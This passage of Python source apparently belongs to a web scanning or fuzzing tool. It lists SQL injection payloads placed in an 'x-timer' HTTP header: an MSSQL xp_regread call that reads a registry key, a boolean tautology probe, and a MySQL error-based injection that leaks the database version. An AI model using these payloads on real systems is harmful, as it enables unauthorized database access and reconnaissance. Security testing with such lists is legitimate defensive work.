...
payloads_keys = [  # {"xxxx":"缓"},
    ...
    {
        "x-timer": "1'; EXEC xp_regread('HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters', 'nullsessionshares'); --"
    },
    {"x-timer": "1' AND 1=1 --"},
    {
        "x-timer": "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
    },
